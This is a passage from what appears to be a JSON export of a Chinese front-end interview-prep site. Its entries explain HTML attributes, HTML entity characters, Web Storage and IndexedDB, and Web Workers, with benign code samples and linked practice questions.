内的权限（如允许摄像头、麦克风访问）。\n\n### 8. **图像和图形属性**\n   - **srcset**：为不同设备提供不同分辨率的图像资源。\n   - **sizes**：配合 `srcset`，定义不同视口下图像显示的尺寸。\n   - **usemap**：指定图片使用的图像映射。\n   - **height/width**：定义图片或其他元素的高度和宽度。\n\n### 9. **meta 标签属性**\n   - **charset**：指定文档的字符编码（如 `UTF-8`）。\n   - **name** 和 **content**：为文档提供元信息（如 `description`, `viewport`）。\n   - **http-equiv**：配合 `content`，定义 HTTP 头信息（如 `refresh`, `Content-Type`）。\n\n### 10. **无障碍相关属性**\n   - **aria-* 属性**：为无障碍工具（如屏幕阅读器）提供更多语义信息。\n   - **role**：指定元素的功能角色，增强无障碍性。\n\n### 11. **iframe 和图片的懒加载**\n   - **loading=\"lazy\"**：为图片和 iframe 启用懒加载。\n\n### 12. **语言和方向属性**\n   - **lang**：指定元素或页面的语言（如 `lang=\"en\"`）。\n   - **dir**：指定文本的书写方向（如 `ltr` 左到右，`rtl` 右到左）。\n",
    "exerciseKeyList": "[\"b90eb9af-fa06-4b4e-ba83-fbe34330cbf6\",\"d4cff3fa-0488-47d6-a488-705ea93e174c\",\"9d35a1bc-a10f-45d0-a6ee-a141327bd9a8\",\"523d454b-755e-4c1f-9952-440e469195a3\",\"072b9f8d-7383-4823-9508-77e4e9d1744c\",\"a82eaabe-70e6-47ed-b29d-d036e80e0815\",\"2acd6447-af1d-4430-837f-a468b6c76ffe\",\"87b1f0a2-a058-4f00-ae03-7d85bd19cbf5\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 4,
    "createAt": "2024-10-15T01:45:48.000Z",
    "updateAt": "2024-11-06T06:13:21.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "072b9f8d-7383-4823-9508-77e4e9d1744c",
        "title": "img的srcset属性的作⽤？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-25T06:26:42.000Z",
        "updateAt": "2024-07-22T10:07:38.000Z"
      },
      {
        "exerciseKey": "2acd6447-af1d-4430-837f-a468b6c76ffe",
        "title": "script 标签中， async 和 defer 两个属性有什么用途和区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T05:25:30.000Z",
        "updateAt": "2024-08-10T17:04:52.000Z"
      },
      {
        "exerciseKey": "523d454b-755e-4c1f-9952-440e469195a3",
        "title": "HTML 部分标签中的 crossorigin 属性，作用是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-05T01:32:08.000Z"
      },
      {
        "exerciseKey": "87b1f0a2-a058-4f00-ae03-7d85bd19cbf5",
        "title": "script 标签上有那些属性，作用分别是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-28T01:34:04.000Z"
      },
      {
        "exerciseKey": "9d35a1bc-a10f-45d0-a6ee-a141327bd9a8",
        "title": " link 标签的 rel 属性中，preload 和 prefetch 这两个值的作用是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-05T01:30:22.000Z"
      },
      {
        "exerciseKey": "a82eaabe-70e6-47ed-b29d-d036e80e0815",
        "title": "标签上title属性与alt属性的区别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T07:35:04.000Z",
        "updateAt": "2021-07-04T16:03:46.000Z"
      },
      {
        "exerciseKey": "b90eb9af-fa06-4b4e-ba83-fbe34330cbf6",
        "title": "html 中前缀为 data- 开头的元素属性是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-09-04T01:30:15.000Z"
      },
      {
        "exerciseKey": "d4cff3fa-0488-47d6-a488-705ea93e174c",
        "title": "link 标签有哪些属性，分别有什么作用？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-05T01:24:08.000Z"
      }
    ]
  },
  "137": {
    "id": 137,
    "tagId": 12,
    "title": "实体字符（转义字符）",
    "explanation": "HTML 的实体字符（HTML Entities）是用于显示某些特殊字符或符号的编码形式。\n\nHTML 中某些符号具有特殊含义，例如 `<`, `>`, `&` 等字符不能直接在网页内容中使用，所以需要使用实体字符来表示它们。\n\n### 常见的 HTML 实体字符\n\n1. **空格和控制字符**\n   - **`&nbsp;`**：空格字符 (non-breaking space)\n     ```html\n     &nbsp; <!-- 表示一个空格 -->\n     ```\n   - **`&lt;`**：小于号 `<`\n     ```html\n     &lt;div&gt; <!-- 表示 <div> -->\n     ```\n   - **`&gt;`**：大于号 `>`\n     ```html\n     &gt;/div&gt; <!-- 表示 </div> -->\n     ```\n   - **`&amp;`**：与符号 `&`\n     ```html\n     &amp; <!-- 表示 & -->\n     ```\n   - **`&quot;`**：双引号 `\"`\n     ```html\n     &quot;Hello&quot; <!-- 表示 \"Hello\" -->\n     ```\n   - **`&apos;`**：单引号 `'`\n     ```html\n     &apos;Hello&apos; <!-- 表示 'Hello' -->\n     ```\n\n2. **数学符号**\n   - **`&plus;`**：加号 `+`\n   - **`&minus;`**：减号 `−`\n   - **`&times;`**：乘号 `×`\n   - **`&divide;`**：除号 `÷`\n\n3. **货币符号**\n   - **`&dollar;`**：美元符号 `$`\n   - **`&euro;`**：欧元符号 `€`\n   - **`&pound;`**：英镑符号 `£`\n   - **`&yen;`**：日元符号 `¥`\n\n4. **其他常见符号**\n   - **`&copy;`**：版权符号 `©`\n   - **`&reg;`**：注册商标符号 `®`\n   - **`&trade;`**：商标符号 `™`\n   - **`&sect;`**：章节符号 `§`\n   - **`&deg;`**：度数符号 `°`\n\n5. **希腊字母**\n   - **`&alpha;`**：α\n   - **`&beta;`**：β\n   - **`&gamma;`**：γ\n   - **`&delta;`**：δ\n\n### 为什么需要实体字符？\n- **避免 HTML 解析冲突**：例如 `<`, `>`, `&` 等符号在 HTML 中有特定的用途，用实体字符可以避免冲突。\n- **显示特殊符号**：例如版权符号、商标符号或货币符号等，不能直接在键盘上输入，使用实体字符可以确保正确显示。\n",
    "testPoint": "### 1. **HTML 实体字符的定义与作用**\n   - 什么是 HTML 实体字符？为什么需要使用它们？\n   - 实体字符用于在 HTML 中显示特殊符号（如 `<`, `>`, `&`, `\"` 等）或不可见字符（如空格 ` `、换行符等），避免与 HTML 语法冲突。\n\n### 2. **常见的 HTML 实体字符**\n   - **`&lt;`**：小于号 `<`\n   - **`&gt;`**：大于号 `>`\n   - **`&amp;`**：与符号 `&`\n   - **`&quot;`**：双引号 `\"`\n   - **`&apos;`**：单引号 `'`\n   - **`&nbsp;`**：不间断空格 ` `\n\n### 3. **Unicode 和 ASCII 编码的实体字符**\n   - HTML 支持通过 `&#xNNNN;`（十六进制）或 `&#NNNN;`（十进制）表示 Unicode 字符。例如：\n     - `&#x2665;` 或 `&#9829;` 表示 ♥\n   - 考察点可能涉及通过实体字符显示 Unicode 表情符号、语言字符等。\n\n### 4. **转义字符**\n   - 在 HTML 中如何使用实体字符进行转义？\n   - 为什么需要转义符号（如 `<`, `>`, `&`）？特别是在 HTML 元素内嵌 JavaScript 或样式时需要避免歧义。\n   - 安全性方面的考量，尤其是防止 XSS（跨站脚本攻击）。\n\n### 5. **空白字符**\n   - **`&nbsp;`**（不间断空格）：防止自动换行或保留多个空格。\n   - **`&ensp;`** 和 **`&emsp;*`*：半角和全角空格符号。\n   - 实体空白符在排版和布局中的应用（如对齐、占位）。\n\n### 6. **其他常见实体字符**\n   - 货币符号：如 **`&yen;`**（¥）、**`&euro;`**（€）。\n   - 数学符号：如 **`&plusmn;`**（±）、**`&times;`**（×）、**`&divide;`**（÷）。\n   - 特殊符号：如 **`&copy;`**（©）、**`&reg;`**（®）、**`&trade;`**（™）。\n\n### 7. **HTML5 实体字符扩展**\n   - HTML5 中新增的一些实体字符，如：\n     - **`&le;*`*（≤）和 **`&ge;`**（≥）\n     - **`&bull;`**（•）用于列表符号\n     - **`&hellip;`**（…）省略号\n\n### 8. **实体字符与浏览器兼容性**\n   - 浏览器如何处理不支持的实体字符？\n   - 考察点可能涉及浏览器对不同编码的支持，以及如何确保兼容性。\n\n### 9. **HTML 实体字符与国际化**\n   - 如何通过实体字符支持多语言文本？\n   - 考察 Unicode 与实体字符在国际化中的应用，如如何使用实体字符表示非 ASCII 字符。\n\n### 10. **HTML 实体字符在输入表单中的应用**\n   - 在表单中，如何防止特殊字符输入导致 HTML 注入攻击？\n   - 使用实体字符保护表单数据的完整性和安全性。",
    "exerciseKeyList": "[\"b5effd7b-86b9-49b9-a658-43e940ea19af\",\"b45cda77-44a7-45aa-a563-eb46bc5fd1d6\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 13,
    "createAt": "2024-10-15T01:59:01.000Z",
    "updateAt": "2024-11-06T06:12:54.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "b45cda77-44a7-45aa-a563-eb46bc5fd1d6",
        "title": "html 中有哪些常见的实体字符？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-10-15T01:58:19.000Z",
        "updateAt": "2024-10-15T01:58:32.000Z"
      },
      {
        "exerciseKey": "b5effd7b-86b9-49b9-a658-43e940ea19af",
        "title": "html 文档中常见的 &nbsp; 是什么，有什么作用？\n\n",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-10-15T01:56:17.000Z",
        "updateAt": "2024-10-15T01:58:29.000Z"
      }
    ]
  },
  "138": {
    "id": 138,
    "tagId": 12,
    "title": "离线存储",
    "explanation": "HTML5 离线存储是指通过 **Web Storage** API 提供的一种在客户端本地存储数据的机制，主要有两种方式：**localStorage** 和 **sessionStorage**。与传统的 Cookie 相比，Web Storage 提供了更大容量、灵活性，并且数据不会随着 HTTP 请求自动发送到服务器，这可以优化性能和安全性。此外，HTML5 还支持 **离线应用缓存（Application Cache）** 和 **IndexedDB**，用于更加复杂的数据存储需求和离线应用。\n\n### 工作原理\n\nHTML5 的离线存储主要通过以下几个机制来实现数据存储和访问：\n\n1. **localStorage**：一种持久性存储机制，数据存储在用户的浏览器中，即使关闭浏览器或重新加载页面，数据也不会丢失，除非明确被删除。其特点是跨页面、跨会话存储数据。\n   \n2. **sessionStorage**：会话级别的存储机制，只在当前页面的会话期间有效。当会话结束或浏览器窗口关闭时，数据会自动删除。其特点是只能在当前窗口或标签页中存储数据，不能跨窗口或标签页共享。\n\n3. **Application Cache（已被 Service Worker 替代）**：允许开发者将网站的某些资源缓存到本地，使得用户即使在离线的情况下也能访问特定页面。虽然该机制已被弃用，但它曾经是实现离线访问的核心。\n\n4. **IndexedDB**：一种更为复杂的浏览器内置数据库，支持存储结构化数据，如对象和文件。它适用于更大规模的数据存储需求，并且允许通过索引进行高效的查询和数据操作。\n\n### 使用方式\n\n#### 1. **localStorage**\n- **特点**：持久性存储，浏览器关闭后数据依然存在，除非手动清除。\n- **使用方式**：\n```javascript\n// 存储数据\nlocalStorage.setItem('key', 'value');\n\n// 获取数据\nlet value = localStorage.getItem('key');\n\n// 删除数据\nlocalStorage.removeItem('key');\n\n// 清空所有 localStorage\nlocalStorage.clear();\n```\n\n#### 2. **sessionStorage**\n- **特点**：仅在当前会话期间有效，浏览器关闭或页面重新加载后数据会被清除。\n- **使用方式**：\n```javascript\n// 存储数据\nsessionStorage.setItem('sessionKey', 'sessionValue');\n\n// 获取数据\nlet sessionValue = sessionStorage.getItem('sessionKey');\n\n// 删除数据\nsessionStorage.removeItem('sessionKey');\n\n// 清空所有 sessionStorage\nsessionStorage.clear();\n```\n\n#### 3. **IndexedDB**\n- **特点**：适合存储大量的结构化数据，支持异步 API 和事务。\n- **使用方式**：\n   IndexedDB 的使用较为复杂，通常涉及打开数据库、创建事务、存储和检索数据等操作。一个简单的示例如下：\n```javascript\nlet request = indexedDB.open('myDatabase', 1);\n\nrequest.onupgradeneeded = function(event) {\n  let db = event.target.result;\n  let objectStore = db.createObjectStore('myObjectStore', { keyPath: 'id' });\n};\n\nrequest.onsuccess = function(event) {\n  let db = event.target.result;\n  let transaction = db.transaction(['myObjectStore'], 'readwrite');\n  let objectStore = transaction.objectStore('myObjectStore');\n  objectStore.add({ id: 1, name: 'John Doe' });\n};\n```\n\n#### 4. **Application Cache（弃用）**\n- **特点**：通过 manifest 文件指定需要缓存的资源，允许在离线时访问应用。\n- **使用方式**：\n   在 HTML 文档中指定 manifest 文件：\n```html\n<html manifest=\"app.manifest\">\n```\n   然后在 `app.manifest` 文件中列出需要缓存的资源：\n```\nCACHE MANIFEST\n# 版本 1.0\n\nCACHE:\nindex.html\nstyles.css\nscript.js\n\nNETWORK:\n*\n```\n**注意**：由于该技术已被弃用，开发者应使用更先进的 **Service Workers** 实现离线应用缓存。\n\n### 使用场景\n\n#### 1. **localStorage 使用场景**\n   - **持久化用户偏好设置**：例如主题、语言、字体大小等，用户下次访问时可以加载之前的设置。\n   - **保存购物车内容**：用户可以关闭浏览器再重新打开，购物车中的商品信息依然存在。\n   - **表单数据缓存**：在用户填写表单时，如果页面刷新或浏览器意外关闭，可以在用户下次访问时恢复填写的内容。\n\n#### 2. **sessionStorage 使用场景**\n   - **临时保存多步骤表单数据**：适合单次会话中暂时保存数据，比如多步骤表单的中间数据。\n   - **页面跳转间的数据传递**：在不同页面之间传递一些临时数据，不需要持久化保存。\n\n#### 3. **IndexedDB 使用场景**\n   - **大型离线应用**：例如，离线的待办事项管理器、笔记应用等，需要保存大量用户数据，并且需要复杂的查询和排序功能。\n   - **存储结构化数据**：适用于存储 JSON、文件等结构化数据，或者通过索引进行高效的查询。\n\n#### 4. **Application Cache（已弃用，使用 Service Worker 替代）**\n   - **离线访问**：在没有网络连接的情况下允许用户访问某些页面或资源。\n\n### 优缺点\n\n#### 优点：\n1. **容量大**：与 Cookie 相比，`localStorage` 和 `sessionStorage` 提供了 5-10 MB 的存储空间，而 Cookie 仅有 4 KB。\n2. **高效**：Web Storage 不会随着每个请求发送到服务器，因此减轻了服务器的负担，并提高了页面加载速度。\n3. **安全**：数据存储在本地，不会暴露在每次请求中，降低了某些安全风险。\n4. **API 简单**：提供简单易用的 API 进行存储、读取和删除操作。\n\n#### 缺点：\n1. **不支持旧版浏览器**：较老的浏览器不支持 Web Storage（尤其是 IE7 及更早版本）。\n2. **安全性**：如果页面存在 XSS 漏洞，攻击者可以利用 Web Storage 来存取敏感数据。\n3. **同步特性**：localStorage 和 sessionStorage 都是同步操作，可能会在数据量大时阻塞主线程。",
    "testPoint": "### 1. **localStorage 与 sessionStorage 的区别**\n   - **存储时长**：`localStorage` 是持久存储，关闭浏览器后数据依然存在；`sessionStorage` 是会话级别存储，关闭浏览器或标签页时数据会被清除。\n   - **存储范围**：`localStorage` 可以在多个页面共享数据；`sessionStorage` 只能在当前标签页或窗口中使用，不能跨页面或标签页共享。\n   - **存储容量**：两者存储容量一般都在 5-10 MB 之间，但具体由浏览器厂商决定。\n\n### 2. **Web Storage 与 Cookie 的区别**\n   - **容量限制**：Cookie 容量限制较小，通常为 4 KB；Web Storage 容量更大，通常为 5-10 MB。\n   - **通信特性**：Cookie 随每次 HTTP 请求发送给服务器，而 Web Storage 数据仅存储在本地，不会自动随请求发送，提升了性能。\n   - **作用域和存储方式**：Cookie 可设置过期时间和作用域（域名和路径），而 Web Storage 仅限于同源策略下的客户端存储。\n\n### 3. **Web Storage 的 API**\n   - **存储数据**：`localStorage.setItem(key, value)` 和 `sessionStorage.setItem(key, value)`。\n   - **读取数据**：`localStorage.getItem(key)` 和 `sessionStorage.getItem(key)`。\n   - **删除数据**：`localStorage.removeItem(key)` 和 `sessionStorage.removeItem(key)`。\n   - **清空存储**：`localStorage.clear()` 和 `sessionStorage.clear()`。\n   - 考察点可能涉及 API 的具体用法及如何操作存储的数据。\n\n### 4. **Web Storage 的数据存储格式**\n   - 数据只能以 **字符串** 的形式存储，存储复杂数据结构（如对象、数组）时，通常需要使用 `JSON.stringify()` 和 `JSON.parse()` 进行序列化和反序列化。\n   - 考题可能涉及如何将对象或数组存储在 Web Storage 中。\n\n### 5. **Web Storage 的安全性**\n   - **XSS 攻击**：Web Storage 可以存储大量数据，但如果页面存在 XSS（跨站脚本）漏洞，恶意脚本可能会读取存储的数据。因此，考察点可能涉及如何防止 XSS 攻击，如输入数据的转义和编码等。\n   - **权限控制**：如何确保 Web Storage 数据只在特定域名或路径下访问，防止数据泄露。\n\n### 6. **浏览器支持及兼容性**\n   - 不同浏览器对 Web Storage 的支持情况如何？考察点可能包括如何检测浏览器是否支持 `localStorage` 或 `sessionStorage`，并提供兼容方案。\n   - 例如，如何检查浏览器是否支持 Web Storage：\n   ```javascript\n   if (typeof(Storage) !== \"undefined\") {\n       // 支持 Web Storage\n   } else {\n       // 不支持\n   }\n   ```\n\n### 7. **Web Storage 的存储容量限制**\n   - 不同浏览器对 `localStorage` 和 `sessionStorage` 的容量限制有所不同，考察点可能包括如何处理存储容量超限的情况，以及如何处理存储异常（如 quota exceeded error）。\n   - 如何在使用 Web Storage 时确保不超出存储限制。\n\n### 8. **如何删除 localStorage/sessionStorage 的数据？**\n   - 考题可能会询问如何删除 Web Storage 中的数据，特别是如何删除单个键值对或清除所有存储的数据。\n\n### 9. **Web Storage 的使用场景**\n   - 考察点可能涉及根据不同需求选择 `localStorage` 或 `sessionStorage`。例如，何时适合使用持久化存储（如用户偏好、购物车内容），何时适合使用会话级存储（如表单的中间状态）。\n   - 需要能够根据业务场景灵活运用 Web Storage。\n\n### 10. **数据持久性和生命周期**\n   - 如何解释 `localStorage` 数据的持久性？即使刷新页面或关闭浏览器后，数据仍然存在。\n   - `sessionStorage` 的生命周期管理，如何控制数据的会话级存储。\n\n### 11. **IndexedDB 与 Web Storage 的区别**\n   - 面试中可能会比较 `IndexedDB` 和 Web Storage（`localStorage` 和 `sessionStorage`）之间的区别，如 `IndexedDB` 更适合存储大数据或结构化数据，Web Storage 适合存储简单键值对数据。\n   - 何时选择使用 `IndexedDB` 而不是 `localStorage`。\n\n### 12. **Service Workers 与 Web Storage 的配合使用**\n   - 如何结合使用 `Service Workers` 和 `localStorage` 来实现离线应用的数据持久化。\n   - 考题可能涉及如何处理离线数据存储、数据同步等。\n\n### 13. **localStorage 的跨域限制**\n   - 考察 `localStorage` 和 `sessionStorage` 是否能在不同域名或不同子域间共享数据，以及同源策略的应用。\n   - 如何在跨域情况下共享数据。\n\n### 14. **如何清除用户数据**\n   - 如果用户希望清除所有的存储数据，除了删除浏览器缓存外，还有哪些方式可以删除 `localStorage` 和 `sessionStorage` 的数据？\n   - 是否可以通过代码控制 Web Storage 的清空操作。\n\n### 15. **Web Storage 可能带来的问题**\n   - 可能会考察 Web Storage 的潜在问题，例如：存储容量的限制、数据持久化的安全性问题、跨域访问的限制等。\n",
    "exerciseKeyList": "[\"ec9fd724-c3ab-453f-818c-a4909155c5f6\",\"718abe6b-08ab-4669-bc33-187fabad8fec\",\"93ffefee-3471-48a5-b60c-1b7adf8edf13\",\"d2d8725c-7941-4ba8-9b92-67a730fa1097\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 14,
    "createAt": "2024-10-16T01:26:52.000Z",
    "updateAt": "2024-11-06T06:12:54.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "718abe6b-08ab-4669-bc33-187fabad8fec",
        "title": "cookie、localStorage和sessionStorage 三者之间有什么区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-15T16:01:01.000Z",
        "updateAt": "2024-08-10T17:06:17.000Z"
      },
      {
        "exerciseKey": "93ffefee-3471-48a5-b60c-1b7adf8edf13",
        "title": "浏览器是如何对 HTML5 的离线储存资源进行管理和加载？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-25T06:31:31.000Z",
        "updateAt": "2024-07-22T10:07:14.000Z"
      },
      {
        "exerciseKey": "d2d8725c-7941-4ba8-9b92-67a730fa1097",
        "title": "HTML5的离线储存怎么使用，它的工作原理是什么",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-06-25T06:31:05.000Z",
        "updateAt": "2024-07-22T10:07:26.000Z"
      },
      {
        "exerciseKey": "ec9fd724-c3ab-453f-818c-a4909155c5f6",
        "title": "如何实现可过期的 localStorage 数据?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:16:26.000Z"
      }
    ]
  },
  "139": {
    "id": 139,
    "tagId": 12,
    "title": "Web Workers",
    "explanation": "在浏览器和服务器上，JavaScript程序在单个处理线程上运行。这意味着程序一次只能做一件事。简单来说，你的新电脑可能有32核的CPU，但当JavaScript应用程序运行时，其中31个核心都处于空闲状态。\n\nJavaScript的单线程避免了复杂的并发情况。如果两个线程同时尝试进行不兼容的更改会发生什么？例如，一个浏览器可能在另一个线程重定向到新的URL并从内存中清除该文档时正在更新DOM。Node.js、Deno和Bun都继承了浏览器的单线程引擎。\n\n这不是JavaScript特定的限制。大多数语言都是单线程的，但像PHP和Python这样的Web选项通常在Web服务器上运行，为每个用户请求启动解释器的新线程的不同实例。这会消耗资源，因此Node.js应用程序通常定义自己的Web服务器，该服务器在单个线程上运行，并异步处理每个传入的请求。\n\nNode.js的方法在处理高流量负载时可能更高效，但长时间运行的JavaScript函数会消耗效率收益。\n\n在我们演示如何使用Web Workers解决执行速度问题之前，我们首先要了解JavaScript的运行方式以及为什么长时间运行的函数会引发问题。\n\n## JavaScript非阻塞I/O事件循环\n\n你可能会认为一次只做一件事会导致性能瓶颈，但JavaScript是异步的，这就避免了大部分单线程处理问题，因为：\n\n-   不需要等待用户在网页上点击按钮。 浏览器触发一个事件，当点击发生时调用JavaScript函数。\n-   不需要等待Ajax请求的响应。 浏览器触发一个事件，在服务器返回数据时调用JavaScript函数。\n-   Node.js应用程序不需要等待数据库查询的结果。 运行时在数据可用时调用JavaScript函数。\n\nJavaScript引擎运行一个事件循环。一旦代码的最后一条语句执行完毕，运行时会循环回来，检查是否有未完成的定时器、待处理的回调函数和数据连接，然后根据需要执行回调函数。 其他操作系统处理线程负责调用诸如HTTP请求、文件处理和数据库连接等输入/输出系统。它们不会阻塞事件循环。事件循环可以继续执行下一个在队列中等待的JavaScript函数。\n\n![简化的 JavaScript 事件循环](https://static.ecool.fun//article/8de3a532-19db-457b-a56d-7bba98a55ba7.jpeg)\n\n实质上，JavaScript引擎的主要责任是运行JavaScript代码。操作系统处理所有其他可能导致引擎调用JavaScript函数的I/O操作。\n\n## 长时间运行的JavaScript函数\n\nJavaScript函数通常由事件触发。它们会进行一些处理，输出一些数据，并且大部分情况下会在毫秒级别内完成，以便事件循环可以继续运行。\n\n不幸的是，一些长时间运行的函数可能会阻塞事件循环。想象一下，你正在开发自己的图像处理函数（如锐化、模糊、灰度化等）。异步代码可以从文件中读取（或写入）数百万字节的像素数据，这对JavaScript引擎影响很小。然而，处理图像的JavaScript代码可能需要几秒钟来计算每个像素。该函数会阻塞事件循环，直到它完成，其他JavaScript代码无法运行。\n\n-   在浏览器中，用户将无法与页面进行交互。他们无法点击、滚动或输入，并且可能会看到一个“脚本无响应”的错误，其中有停止处理的选项。\n    \n-   对于Node.js服务器应用程序而言，情况更糟糕。在函数执行时，它无法响应其他请求。如果函数需要花费10秒钟来完成，那么在那个时间点访问的每个用户都必须等待最多10秒钟，即使他们没有处理图像。\n    \n\n你可以通过将计算拆分为较小的子任务来解决这个问题。下面的代码使用传递的imageFn函数，最多处理1,000个像素（从一个数组中）。然后，它使用1毫秒的setTimeout延迟调用自身。事件循环的阻塞时间较短，这样JavaScript引擎可以在迭代之间处理其他传入的事件：\n\n```js\n// pass callback function, image processing function, and input image\n// return an output image to a callback function\nfunction processImage( callback, imageFn = i => {}, imageIn = [] ) {\n\n  const chunkSize = 1000; // pixels to process per iteration\n\n  // process first chunk\n  let\n    imageOut = [],\n    pointer = 0;\n\n  processChunk();\n\n  // process a chunk of data\n  function processChunk() {\n\n    const pointerEnd = pointer + chunkSize;\n\n    // pass chunk to image processing function\n    imageOut = imageOut.concat(\n      imageFn( imageIn.slice( pointer, pointerEnd ) )\n    );\n\n    if (pointerEnd < imageIn.length) {\n\n      // process next chunk after a short delay\n      pointer = pointerEnd;\n      setTimeout(processChunk, 1);\n\n    }\n    else if (callback) {\n\n      // complete - return output image to callback function\n      callback( null, imageOut );\n\n    }\n\n  }\n\n}\n```\n\n这种方法可以防止脚本无响应，但不总是切实可行的。单个执行线程仍然会执行所有的工作，即使CPU可能有更多的处理能力。为了解决这个问题，我们可以使用Web Workers。\n\n## Web Workers\n\nWeb Workers允许脚本在后台线程中运行。Worker在自己的引擎实例和事件循环中运行，与主执行线程分开。它可以并行执行，而不会阻塞主事件循环和其他任务。\n\n使用Worker脚本的步骤如下：\n\n1.  主线程通过消息将所有必要的数据发送出去。\n2.  Worker中的事件处理程序执行，并开始计算。\n3.  完成后，Worker通过消息将返回的数据发送回主线程。\n4.  主线程中的事件处理程序执行，解析传入的数据，并采取必要的操作。\n\n![1668257710js-worker-process.svg](https://static.ecool.fun//article/5bdb102e-199f-4c30-98db-f86cfc198f46.jpeg)\n\n主线程或任何Worker都可以创建任意数量的Worker。多个线程可以并行处理不同的数据块，以比单个后台线程更快地确定结果。然而，每个新线程都有启动开销，因此确定最佳平衡可能需要一些实验。\n\n所有浏览器、Node.js 10+、Deno和Bun都支持类似的Worker语法，尽管服务器运行时可以提供更高级的选项。\n\n## 专用Worker vs 共享Worker\n\n专用Worker（Dedicated Worker）和共享Worker（Shared Worker）是Web Worker API中的两种不同类型的工作线程。它们在如何被创建、使用和共享资源方面有所不同。\n\n专用Worker是只能被单个文档使用的工作线程。它们由特定的脚本文件创建，只能被创建它们的文档访问。专用Worker在创建之后，将与创建它的文档独立运行，可以在后台进行复杂的计算和处理，而不会阻塞主线程的运行。专用Worker之间是相互独立的，彼此不能共享数据或通信。\n\n共享Worker是可以被多个文档共享使用的工作线程。它们由一个脚本文件创建，并可以被多个文档同时连接和使用。共享Worker可以与多个文档进行通信和共享数据，使得多个文档可以协同工作和共享计算资源。共享Worker可以用于创建集中式的消息传递系统，以便多个文档之间进行数据交换和通信。\n\n总的来说，专用Worker适用于需要为单个文档创建独立计算线程的场景，而共享Worker适用于需要在多个文档之间共享计算资源和进行协同工作的场景。选择使用哪种类型的工作线程取决于具体的应用需求和设计架构。\n\n## Client-side Worker限制\n\n客户端工作线程（Client-side Worker）是在浏览器中运行的JavaScript线程，用于在后台执行计算密集型任务，以避免阻塞主线程。然而，客户端工作线程也有一些限制，包括以下几点：\n\n1.  同源策略：客户端工作线程受到同源策略的限制，即只能与同源的脚本进行通信。这意味着客户端工作线程只能与与其来源相同的脚本进行交互，无法直接与其他域的脚本进行通信。\n2.  无法访问DOM：客户端工作线程不能直接访问或操作浏览器的DOM（文档对象模型）。这是为了避免多线程操作DOM引发的潜在竞态条件和不确定性。如果需要操作DOM，可以通过与主线程进行通信来委托主线程执行相关操作。\n3.  无法访问某些API：客户端工作线程无法直接访问一些浏览器API，如`window`对象、`document`对象、`alert()`函数等。这些功能只能通过与主线程进行通信来间接访问。\n4.  不是所有浏览器都支持：尽管现代浏览器普遍支持客户端工作线程，但并不是所有浏览器都支持该功能。一些旧版本的浏览器可能不支持或提供有限支持。\n\n需要注意的是，虽然客户端工作线程有一些限制，但它们仍然是在浏览器中进行并行计算的有用工具。合理使用客户端工作线程，可以提高Web应用程序的性能和响应能力，特别是在处理大量数据或复杂计算时。\n\n## 如何使用 client-side web worker\n\n以下演示将src/index.js定义为主要脚本，当用户点击开始按钮时，它会启动时钟并启动Web Worker。它通过定义一个Worker对象，使用src/worker.js的脚本名称（相对于HTML文件）来指定工作线程脚本：\n\n```js\n// run on worker thread\nconst worker = new Worker(\"./src/worker.js\");\n```\n\n接下来是一个onmessage事件处理程序。当工作线程向主脚本发送数据时（通常是计算完成时），此处理程序将运行。数据可以在事件对象的data属性中获得，并将其传递给endDiceRun()函数：\n\n```js\nworker.onmessage = function(e) {\n  endDiceRun(e.data);\n};\n```\n\n主要脚本使用`postMessage()`方法启动工作线程，并发送数据（一个名为`cfg`的对象）：\n\n```js\nworker.postMessage(cfg);\n```\n\n在`src/worker.js`中定义了工作线程的代码。它使用`importScripts()`方法导入了`src/dice.js`脚本，`importScripts()`是一个全局的工作线程方法，用于同步地将一个或多个脚本导入到工作线程中。文件引用是相对于工作线程所在位置的：\n\n```js\nimportScripts('./dice.js');\n```\n\n`src/dice.js`定义了一个`diceRun()`函数来计算骰子投掷的统计数据：\n\n```js\nfunction diceRun(runs = 1, dice = 2, sides = 6) {\n  const stat = [];\n\n  while (runs > 0) {\n    let sum = 0;\n\n    for (let d = dice; d > 0; d--) {\n      sum += Math.floor(Math.random() * sides) + 1;\n    }\n    stat[sum] = (stat[sum] || 0) + 1;\n    runs--;\n  }\n\n  return stat;\n}\n```\n\n> 请注意这不是ES模块\n\n在`src/worker.js`中，定义了一个`onmessage()`事件处理程序。当主调脚本（`src/index.js`）向工作线程发送数据时，此处理程序将运行。事件对象具有一个`data`属性，该属性提供对消息数据的访问。在这种情况下，它是一个包含`.throws`、`.dice`和`.sides`属性的`cfg`对象，这些属性将作为参数传递给`diceRun()`函数：\n\n```js\nonmessage = function(e) {\n\n  // start calculation\n  const cfg = e.data;\n  const stat = diceRun(cfg.throws, cfg.dice, cfg.sides);\n\n  // return to main thread\n  postMessage(stat);\n\n};\n```\n\n多线程处理发生在主脚本和工作线程之间通过消息传递的过程中：\n\n1.  主脚本定义了一个Worker对象并调用`postMessage()`方法发送数据。\n2.  工作线程执行了一个`onmessage`事件处理程序，该处理程序开始进行计算。\n3.  